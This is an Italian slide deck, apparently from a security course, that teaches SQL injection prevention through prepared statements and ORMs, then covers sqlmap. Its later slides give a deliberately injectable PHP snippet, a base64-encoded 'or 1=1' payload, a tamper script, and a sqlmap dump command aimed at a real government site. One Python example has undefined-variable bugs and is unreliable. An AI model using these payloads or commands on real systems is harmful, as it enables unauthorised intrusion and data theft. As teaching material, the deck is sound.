@@ -1,0 +1,494 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>SQL Injection - Lesson 05 - coppito_zero_day</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+					<h4>LESSON 05</h4>
+				</section>
+				<section>
+					<h2>'SQLi PREVENTION</h2>
+					<p>
+						Abbiamo visto come sfruttare una SQLi con varie tecniche e vari
+						obiettivi, ma come possiamo prevenirle quando programmiamo?
+					</p>
+					<p>&nbsp;</p>
+					<h1 class="fragment fade">PREPARED STATEMENT</h1>
+					<h1 class="fragment fade">LIBRERIE</h1>
+					<h1 class="fragment fade">ORM</h1>
+				</section>
+				<section>
+					<h2>'SQLi PREVENTION</h2>
+					<p>
+						<center>
+							Scrivi le query a mano concatenando i parametri?
+						</center>
+					</p>
+					<p>&nbsp;</p>
+					<center>
+						<img class="fragment fade" src="assets/1.jpg" />
+					</center>
+				</section>
+				<section>
+					<h2>'SQLi PREVENTION</h2>
+					<p>
+						<center>
+							Usi la funzione di sanitize scritta da te per evitare le SQLi?
+						</center>
+					</p>
+					<p>&nbsp;</p>
+					<center>
+						<img class="fragment fade" src="assets/2.jpg" />
+					</center>
+				</section>
+				<section>
+					<h2>'SQLi PREVENTION</h2>
+					<p>&nbsp;</p>
+					<h1 class="fragment fade">PREPARED STATEMENT</h1>
+					<h1 class="fragment fade">LIBRERIE</h1>
+					<h1 class="fragment fade">ORM</h1>
+				</section>
+				<section>
+					<h2>'cos'è un prepared statement?</h2>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Un prepared statement (a.k.a. parameterized statement) è una
+						funzionalità dei DBMS per evitare code injection ed eseguire
+						istruzioni simili in maniera ripetuta con la massima efficienza.
+					</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						L'istruzione sql viene utilizzata come un template e ad ogni
+						esecuzione specifici placeholder vengono sostituiti con i valori
+						variabili.
+					</p>
+				</section>
+				<section>
+					<h2>'cos'è un prepared statement?</h2>
+					<p class="fragment fade">
+						Il flusso tipico prevede:
+					</p>
+					<ul>
+						<li class="fragment fade">
+							<b>Prepare</b>: l'applicazione crea il template dell'istruzione
+							SQL con specifici valori chiamati "parametri", "placeholders" o
+							"bind variables".
+						</li>
+						<li class="fragment fade">
+							Il DBMS effettua il parsing, l'ottimizzazione e la conversione
+							dell'istruzione SQL <u>senza eseguirla</u>.
+						</li>
+						<li class="fragment fade">
+							<b>Execute</b>: l'applicazione sostituisce (o lega (bind)) i
+							parametri dell'istruzione SQL con i valori reali ed esegue la
+							query.
+						</li>
+					</ul>
+					<p class="fragment fade">Il DBMS sa esattamente qual'è l'istruzione SQL e
+						quali sono i parametri.<br/>
+						E' impossibile fregarlo facendo passare un parametro per istruzione.
+					</p>
+				</section>
+				<section>
+					<h2>'PHP PDO EXAMPLE</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+// Database connection
+$conn = new PDO("mysql:dbname=mysql", "root");
+
+// Prepare the statement as a query template
+$stmt = $conn->prepare("SELECT * FROM pages WHERE id = ?");
+
+// Declare parameters
+$params = array(11);
+
+// Bind parameters to query template and execute it
+$stmt->execute($params);
+
+// Show results
+echo $stmt->fetch()[1];
+							</code>
+						</pre>
+					</div>
+					<p>&nbsp;</p>
+					<p>
+						<center class="fragment fade">
+							Questo codice non è iniettabile.
+						</center>
+					</p>
+				</section>
+				<section>
+					<h2>'PHP ORM EXAMPLE</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+// Inizialize a new ORM instance
+$capsule = new Capsule;
+// Database connection
+$capsule->addConnection([
+  'driver'    => 'mysql',
+  'host'      => 'db',
+  'database'  => 'sqli_chall4_0',
+  'username'  => 'chall4_0',
+  'password'  => 'random_password'
+]);
+// Query what you need (the ORM will use prepared statements under the hood)
+$result = $capsule->table('memes')->where('id', '=', $_GET['id'])->first();
+// Show results
+echo $result->title;
+							</code>
+						</pre>
+					</div>
+					<p>&nbsp;</p>
+					<p>
+						<center class="fragment fade">
+							Questo codice non è iniettabile.
+						</center>
+					</p>
+				</section>
+				<section>
+					<h2>'NODE.JS EXAMPLE</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+								<code class="hljs js" data-trim>
+// Import mysql library
+const mysql = require('mysql2');
+// create the connection to database
+const connection = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',
+  database: 'test'
+});
+// execute will internally call prepare and query
+connection.execute(
+  'SELECT * FROM `memes` WHERE `id` = ? AND `category` = ?',
+  [51, 'cybersec'],
+  function(err, results, fields) {
+    console.log(results); // results contains rows returned by server
+  }
+);
+							</code>
+						</pre>
+					</div>
+					<p>&nbsp;</p>
+					<p>
+						<center class="fragment fade">
+							Questo codice non è iniettabile.
+						</center>
+					</p>
+				</section>
+				<section>
+					<h2>'PYTHON EXAMPLE</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+								<code class="hljs python" data-trim>
+# Import mysql library
+import mysql.connector
+# Create the connection to db
+connection = mysql.connector.connect(host='localhost',
+                             database='memes',
+                             user='memes',
+                             password='password1')
+# Set the cursor to use prepared statements
+cursor = connection.cursor(prepared=True)
+# Set the query template
+prepstmt = "SELECT id, title FROM memes WHERE id = %s"
+# Bind parameters in a tuple
+cur.execute(prepstmt, (15))
+# Show results
+for row in cur:
+  print row['title']
+							</code>
+						</pre>
+					</div>
+					<p>&nbsp;</p>
+					<p>
+						<center class="fragment fade">
+							Questo codice non è iniettabile.
+						</center>
+					</p>
+				</section>
+				<section>
+					<h2>'SQLMAP</h2>
+					<h4>Cos'è sqlmap</h4>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						sqlmap è un tool open source di penetration testing che automatizza
+						il processo di identificazione ed exploiting di una SQL injection.
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'SQLMAP</h2>
+					<ul>
+						<li class="fragment fade">
+							Supporta MySQL, Oracle, PostgreSQL, MSSQL, SQLite e molti altri
+							DBMS.
+						</li>
+						<li class="fragment fade">
+							Supporta 6 tecniche di SQLi: boolean-based blind, time-based blind,
+							error-based, UNION query-based, stacked queries and out-of-band.
+						</li>
+						<li class="fragment fade">
+							Enumera automaticamente utenti, password hashes, database, ruoli
+							utente, privilegi, tabelle e colonne.
+						</li>
+						<li class="fragment fade">
+							Effettua i dump completi dei database.
+						</li>
+						<li class="fragment fade">
+							Può uploadare e scaricare file.
+						</li>
+						<li class="fragment fade">
+							Può ottenere RCE automaticamente.
+						</li>
+						<li class="fragment fade">
+							Supporta altre feature molto fighe.
+						</li>
+						<li class="fragment fade">
+							E' l'unica cosa che sanno usare gli skiddies di Anonymous Italia (senza capire come funziona).
+						</li>
+					</ul>
+				</section>
+				<section>
+					<h2>'DISCLAIMER</h2>
+					<p>&nbsp;</p>
+					<h3 class="fragment fade">Se eseguire una SQLi senza autorizzazione è illegale...</h3>
+					<p>&nbsp;</p>
+					<h2 class="fragment fade">Usare sqlmap senza autorizzazione è estremamente illegale</h2>
+					<center class="fragment fade">
+						<small>E anche molto rumoroso...</small>
+					</center>
+				</section>
+				<section>
+					<h2>'SQLMAP</h2>
+					<h4>Usage example</h4>
+					<p>&nbsp;</p>
+					<center>
+						<iframe src="https://asciinema.org/a/46601/embed?" id="asciicast-iframe-46601" name="asciicast-iframe-46601" scrolling="no" allowfullscreen="true" style="overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 1000px; float: none; visibility: visible; height: 600px;"></iframe>
+					</center>
+				</section>
+				<section>
+					<h2>'SQLMAP</h2>
+					<h4>Tamper scripts</h4>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p>sqlmap può essere facilmente esteso attraverso i tamper scripts.</p>
+					<p>
+						Questa funzionalità consente di automatizzare un attacco in
+						situazione non-standard.
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'SQLMAP - Tamper scripts</h2>
+					<p class="fragment fade">Mark, web-developer, ha scoperto le SQLi ed è diventato paranoico.</p>
+					<p class="fragment fade">Per proteggere i suoi siti, invece di usare i prepared statements,
+						ha deciso di implementare un base64 query parser.
+					</p>
+					<p class="fragment fade">Ogni parametro viene decodificato con base64 per poi essere
+						usato nella query.
+					</p>
+					<p class="fragment fade">Mark pensa di essere furbo, ma sta facendo una cosa stupida.</p>
+					<h2 class="fragment fade">NON FARE IL MARK E USA I PREPARED STATEMENTS.</h2>
+				</section>
+				<section>
+					<h2>'SQLMAP - Tamper scripts</h2>
+					<h4>Esempio</h4>
+					<p>&nbsp;</p>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+$id = base64_decode($_GET['id']);
+$sql = "SELECT * FROM pages WHERE id = '" . $id . "'";
+$result = $conn->query($sql);
+while($row = $result->fetch_array()){
+  print_r($row);
+}
+							</code>
+						</pre>
+					</div>
+					<small class="fragment fade">Parametri:</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+$_GET['id'] = 'MTEK' // 'MTEK' is 11 base64-encoded
+							</code>
+						</pre>
+					</div>
+					<small class="fragment fade">Risultato:</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT * FROM pages WHERE id = '11';
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'SQLMAP - Tamper scripts</h2>
+					<h4>Esempio</h4>
+					<p>&nbsp;</p>
+					<small class="fragment fade">Per sfruttare l'SQLi dobbiamo riuscire ad iniettare la stringa
+						<code>'or 1=1 -- -</code>, ma sappiamo che i parametri vengono decodificati
+						in base64.
+					</small>
+					<small class="fragment fade">
+						Dobbiamo codificare quindi il parametro in base64.
+					</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs bash" data-trim>
+echo -n "'or 1=1 -- -" | base64 # returns J29yIDE9MSAtLSAt
+							</code>
+						</pre>
+					</div>
+					<small class="fragment fade">Parametri:</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+$_GET['id'] = 'J29yIDE9MSAtLSAt';
+							</code>
+						</pre>
+					</div>
+					<small class="fragment fade">Risultato:</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT * FROM pages WHERE id = '' or 1=1 -- -'
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>BOOM!</p>
+					</div>
+				</section>
+				<section>
+					<center>
+						<img width="800" src="assets/3.jpg">
+					</center>
+					<p>&nbsp;</p>
+					<h2 class="fragment fade">NON FARE IL MARK E USA I PREPARED STATEMENTS.</h2>
+				</section>
+				<section>
+					<h2>'SQLMAP - Tamper scripts</h2>
+					<h4>Esempio</h4>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Ok, abbiamo fregato Mark, ma l'injection era molto semplice.<br />
+						Quanto tempo ci avremmo messo se fosse stato necessario usare
+						una time-based? Encodare a mano almeno 8 volte un parametro per ottenere una
+						sola lettera del nome del database?
+					</p>
+					<p>&nbsp;</p>
+					<h2 class="fragment fade">AUTOMATE YOUR ATTACK!</h2>
+				</section>
+				<section>
+					<h2>'SQLMAP - Tamper scripts</h2>
+					<h4>Esempio</h4>
+					<p>&nbsp;</p>
+					<div class="fragment fade">
+						<pre>
+								<code class="hljs python" data-trim>
+#!/usr/bin/env python
+
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+import base64
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    encoded_payload = base64.b64encode(payload)
+    return encoded_payload
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'SQLMAP - Tamper scripts</h2>
+					<h4>Esempio</h4>
+					<p>&nbsp;</p>
+					<p>
+						<small class="fragment fade">
+							Salviamo questo script in <code>sqlmap/tamper/b64.py</code> e lo
+							eseguiamo con:
+						</small>
+					</p>
+					<p>&nbsp;</p>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs bash" data-trim>
+sqlmap -u "https://www.nsa.gov/news.php?id=MTEK" -tamper="b64.py" -dump
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>SQL Injection</h2>
+					<h4>FINE</h4>
+				</section>
+				<section>
+					<h2>PROSSIMO INCONTRO</h2>
+					<h1>SQLi CTF</h1>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				//height: 1000,
+				hash: true,
+				pdfSeparateFragments: false
+			});
+		</script>
+	</body>
+</html>
